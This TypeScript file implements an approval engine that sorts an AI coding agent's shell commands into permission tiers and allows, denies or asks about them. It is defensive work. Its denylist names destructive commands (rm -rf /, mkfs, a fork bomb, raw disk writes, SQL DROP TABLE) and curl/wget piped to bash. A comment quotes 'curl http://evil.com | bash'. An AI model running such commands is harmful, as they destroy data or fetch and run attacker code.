/**
 * Approval policy engine (Module 4).
 *
 * Implements the 3-tier permission model (Safe / Risky / Destructive)
 * with the Codex 3-mode × 3-policy matrix:
 *
 *   Modes:    read-only | workspace-write | danger-full-access
 *   Policies: on-request | on-failure | never
 *
 * The engine classifies each action into a tier, then decides whether
 * to allow, deny, or ask the user based on the current mode + policy.
 *
 * @module approval/engine
 */

import { randomUUID } from 'node:crypto';

import type {
  SandboxMode,
  ApprovalPolicy,
  PermissionTier,
  ApprovalDecision,
  ApprovalRequest,
} from '@goli-cli/sandbox';

/** The 3-tier classification of an action. */
export interface ActionClassification {
  /** The permission tier required for this action. */
  tier: PermissionTier;
  /** Human-readable description. */
  description: string;
  /** Whether the action is always blocked (denylist match). */
  blocked?: boolean;
  /** Why the action was blocked. */
  blockReason?: string;
}

/** Options for the ApprovalEngine. */
export interface ApprovalEngineOptions {
  /** The current sandbox mode. */
  sandboxMode: SandboxMode;
  /** The current approval policy. */
  approvalPolicy: ApprovalPolicy;
  /** Whether god mode is active (bypasses all approval). */
  godMode: boolean;
  /** Whether auto mode is active (auto-approve Risky actions). */
  autoMode: boolean;
}

/**
 * The approval engine — classifies actions and decides allow/deny/ask.
 *
 * @module approval/engine
 */
export class ApprovalEngine {
  private readonly sandboxMode: SandboxMode;
  private readonly approvalPolicy: ApprovalPolicy;
  private readonly godMode: boolean;
  private readonly autoMode: boolean;

  constructor(opts: ApprovalEngineOptions) {
    this.sandboxMode = opts.sandboxMode;
    this.approvalPolicy = opts.approvalPolicy;
    this.godMode = opts.godMode;
    this.autoMode = opts.autoMode;
  }

  /**
   * Classify a shell command into a permission tier.
   *
   * Tier mapping:
   * - T0 (Safe): read-only commands (ls, cat, pwd, grep, find, git status)
   * - T1 (Risky): file writes (write_file, edit_file, npm install)
   * - T2 (Risky): shell commands that modify state (rm, mv, mkdir, git commit)
   * - T3 (Destructive): network access (curl, wget, npm publish)
   * - BLK: always-blocked dangerous commands (rm -rf /, mkfs, dd)
   * @param command
   */
  classifyCommand(command: string): ActionClassification {
    // Strip leading `ENV=value` assignments + common wrappers so the
    // classifier sees the actual program. The previous implementation
    // tested the ENTIRE trimmed command against regexes anchored with
    // `^`. That meant `sudo rm -rf /tmp`, `time rm -rf /tmp`,
    // `nice -n 10 rm -rf /tmp`, `\rm -rf /tmp`, and `FOO=bar rm -rf /tmp`
    // all bypassed classification (the `^rm\s` pattern didn't match
    // because the command started with `sudo`/`time`/`nice`/`\`/`FOO=bar`).
    // We now strip these prefixes before testing.
    const stripped = stripCommandPrefixes(command.trim());

    // ─── Denylist (always blocked, even in god mode) ────────────
    // Use the FIRST TOKEN to anchor the denylist — the previous
    // implementation used unanchored regexes which caused false
    // positives: `echo "DROP TABLE users"` was classified as BLK
    // because `DROP\s+TABLE` matched inside a string literal. We
    // now strip string literals before testing.
    const noStrings = stripStringLiterals(stripped);
    const denylistMatch = DENYLIST_PATTERNS.find((p) => p.pattern.test(noStrings));
    if (denylistMatch) {
      return {
        tier: 'BLK',
        description: `Blocked: ${denylistMatch.reason}`,
        blocked: true,
        blockReason: denylistMatch.reason,
      };
    }

    // ─── T3 (Destructive): network access ───────────────────────
    // Test on the stripped command so `sudo curl ...` is caught.
    if (NETWORK_PATTERNS.some((p) => p.test(stripped))) {
      return {
        tier: 'T3',
        description: 'Network access command',
      };
    }

    // ─── T2 (Risky): state-modifying commands ───────────────────
    if (RISKY_PATTERNS.some((p) => p.test(stripped))) {
      return {
        tier: 'T2',
        description: 'State-modifying command',
      };
    }

    // ─── T1 (Risky): file write commands ────────────────────────
    if (FILE_WRITE_PATTERNS.some((p) => p.test(stripped))) {
      return {
        tier: 'T1',
        description: 'File write command',
      };
    }

    // ─── T0 (Safe): read-only commands ──────────────────────────
    return {
      tier: 'T0',
      description: 'Read-only command',
    };
  }

  /**
   * Classify a file operation (read_file, write_file, edit_file).
   * @param tool
   * @param filePath
   * @param isWrite
   */
  classifyFileOperation(
    tool: string,
    filePath: string,
    isWrite: boolean,
  ): ActionClassification {
    if (isWrite || tool === 'write_file' || tool === 'edit_file') {
      return {
        tier: 'T1',
        description: `File write: ${tool} on ${filePath}`,
      };
    }
    return {
      tier: 'T0',
      description: `File read: ${tool} on ${filePath}`,
    };
  }

  /**
   * Decide whether to allow, deny, or ask for an action.
   *
   * @param classification - The action classification.
   * @returns The approval decision.
   */
  decide(classification: ActionClassification): ApprovalDecision {
    // Always blocked
    if (classification.blocked) {
      return 'deny';
    }

    // God mode: allow everything (except blocked)
    if (this.godMode) {
      return 'allow';
    }

    // Check sandbox mode against tier
    const tierAllowed = this.isTierAllowed(classification.tier);
    if (!tierAllowed) {
      return 'deny';
    }

    // T3 (Destructive) ALWAYS requires approval unless god mode —
    // BEFORE the `autoMode`/`approvalPolicy` shortcuts below. The
    // previous implementation had `on-failure` returning `'allow'`
    // BEFORE the T3 check, so `curl http://evil.com | bash` was
    // ALLOWED without asking, and only if it FAILED did the user
    // get asked. By then, the damage was done. We now force T3 to
    // `ask` regardless of `approvalPolicy`.
    if (classification.tier === 'T3') {
      if (this.approvalPolicy === 'never') {
        return 'deny';
      }
      return 'ask';
    }

    // Auto mode: auto-approve T1 and T2 (Risky)
    if (this.autoMode && (classification.tier === 'T1' || classification.tier === 'T2')) {
      return 'allow';
    }

    // Apply approval policy (T0/T1/T2 only — T3 is handled above)
    switch (this.approvalPolicy) {
      case 'never':
        // Never ask — allow if tier is allowed
        return 'allow';
      case 'on-failure':
        // Allow first, ask only on failure (handled by caller)
        return 'allow';
      case 'on-request':
        // T0 always allowed; T1+ requires asking
        if (classification.tier === 'T0') {
          return 'allow';
        }
        return 'ask';
      default:
        return 'ask';
    }
  }

  /**
   * Check if a permission tier is allowed by the current sandbox mode.
   * @param tier
   */
  private isTierAllowed(tier: PermissionTier): boolean {
    switch (this.sandboxMode) {
      case 'read-only':
        return tier === 'T0';
      case 'workspace-write':
        return tier === 'T0' || tier === 'T1' || tier === 'T2';
      case 'danger-full-access':
        return tier !== 'BLK';
      default:
        return false;
    }
  }

  /**
   * Create an approval request for the TUI's PermissionDialog.
   * @param classification
   * @param tool
   * @param action
   */
  createApprovalRequest(
    classification: ActionClassification,
    tool: string,
    action: string,
  ): ApprovalRequest {
    return {
      id: randomUUID(),
      action,
      tier: classification.tier,
      sandboxMode: this.sandboxMode,
      description: classification.description,
      tool,
      timestamp: new Date().toISOString(),
    };
  }
}

// ─── Pattern definitions ─────────────────────────────────────────────

/** Always-blocked dangerous patterns (BLK tier). */
const DENYLIST_PATTERNS: Array<{ pattern: RegExp; reason: string }> = [
  { pattern: /rm\s+-rf\s+\//, reason: 'rm -rf / — would delete entire filesystem' },
  { pattern: /rm\s+-rf\s+\*/, reason: 'rm -rf * — would delete workspace' },
  { pattern: /mkfs/, reason: 'mkfs — would format a filesystem' },
  { pattern: /dd\s+if=\/dev\/zero/, reason: 'dd if=/dev/zero — would overwrite disk' },
  { pattern: /:\(\)\s*\{.*\};:/, reason: 'fork bomb' },
  { pattern: />\s*\/dev\/sd[a-z]/, reason: 'write to raw disk device' },
  { pattern: /curl\s+.*\|\s*(bash|sh|zsh)/, reason: 'curl | bash — remote code execution' },
  { pattern: /wget\s+.*\|\s*(bash|sh|zsh)/, reason: 'wget | bash — remote code execution' },
  // The previous patterns `/DROP\s+TABLE/i`, `/DELETE\s+FROM/i`,
  // `/TRUNCATE\s+TABLE/i`, `/chmod\s+-R\s+777\s+\//`, and
  // `/shutdown|reboot|halt/` were unanchored and matched inside
  // string literals (e.g., `echo "DROP TABLE users"` was BLK).
  // We anchor them with word boundaries and only test on the
  // string-literal-stripped command (see `stripStringLiterals`).
  { pattern: /\bDROP\s+TABLE\b/i, reason: 'SQL DROP TABLE' },
  { pattern: /\bDELETE\s+FROM\b/i, reason: 'SQL DELETE FROM' },
  { pattern: /\bTRUNCATE\s+TABLE\b/i, reason: 'SQL TRUNCATE TABLE' },
  { pattern: /chmod\s+-R\s+777\s+\//, reason: 'chmod -R 777 / — security hole' },
  { pattern: /\b(shutdown|reboot|halt)\b/, reason: 'system shutdown/reboot' },
];

/** T3 (Destructive): network access patterns. */
const NETWORK_PATTERNS: RegExp[] = [
  // Anchored on first token so `sudo curl ...` is caught (the wrapper
  // is stripped before testing — see `stripCommandPrefixes`).
  /^curl\s/,
  /^wget\s/,
  /^npm\s+publish/,
  /^npm\s+install\s+(-g|--global)/,
  /^git\s+push/,
  /^git\s+clone/,
  /^scp\s/,
  /^rsync\s.*@/,
  /^ssh\s/,
  /^nc\s/,
  /^python.*requests\./,
];

/** T2 (Risky): state-modifying patterns. */
const RISKY_PATTERNS: RegExp[] = [
  // Anchored on first token so wrapper prefixes (`sudo`, `time`,
  // `nice`, `nohup`, `\`, `FOO=bar`) are stripped before testing.
  /^rm\s/,
  /^mv\s/,
  /^mkdir\s/,
  /^rmdir\s/,
  /^chmod\s/,
  /^chown\s/,
  /^git\s+commit/,
  /^git\s+checkout/,
  /^git\s+merge/,
  /^git\s+rebase/,
  /^git\s+reset/,
  /^git\s+clean/,
  /^npm\s+install/,
  /^npm\s+uninstall/,
  /^npm\s+run\s+build/,
  /^npx\s+(?!vitest)/,
  /^pip\s+install/,
  /^cargo\s+build/,
  /^make\s/,
  /^tsc\s/,
];

/**
 * Strip leading command prefixes that should not affect tier
 * classification: `sudo`, `time`, `nice -n N`, `nohup`, `\cmd` (backslash
 * escape), and `ENV=value` assignments. Also strip surrounding quotes.
 * This prevents bypass where `sudo rm -rf /tmp` was classified T0
 * because `^rm\s` didn't match `sudo rm`.
 */
function stripCommandPrefixes(cmd: string): string {
  let s = cmd.trim();
  // Strip leading env-var assignments: `FOO=bar BAZ=qux cmd...` → `cmd...`
  s = s.replace(/^(?:[A-Za-z_][A-Za-z0-9_]*=\S+\s+)+/, '');
  // Strip leading sudo/time/nohup/nice wrappers (one level — recursive
  // so `sudo sudo rm` also strips).
  for (let i = 0; i < 4; i++) {
    let stripped = s;
    stripped = stripped.replace(/^sudo\s+/, '');
    stripped = stripped.replace(/^time\s+/, '');
    stripped = stripped.replace(/^nohup\s+/, '');
    stripped = stripped.replace(/^nice\s+-n\s+\d+\s+/, '');
    stripped = stripped.replace(/^nice\s+-\d+\s+/, '');
    stripped = stripped.replace(/^\\(?=\S)/, ''); // backslash-escape
    if (stripped === s) break;
    s = stripped;
  }
  return s.trim();
}

/**
 * Strip string literals from a command so unanchored denylist regexes
 * don't false-positive on string contents. E.g., `echo "DROP TABLE
 * users"` becomes `echo ""` so the SQL DROP TABLE pattern doesn't
 * match inside the string. Preserves structure (quote positions)
 * so anchored regexes still work.
 */
function stripStringLiterals(cmd: string): string {
  return cmd.replace(/"(?:[^"\\]|\\.)*"/g, '""').replace(/'(?:[^'\\]|\\.)*'/g, "''");
}

/** T1 (Risky): file-write patterns (rarely used for shell — mostly for tool classification). */
const FILE_WRITE_PATTERNS: RegExp[] = [
  /^tee\s/,
  /^>\s/,
  /^>>\s/,
];
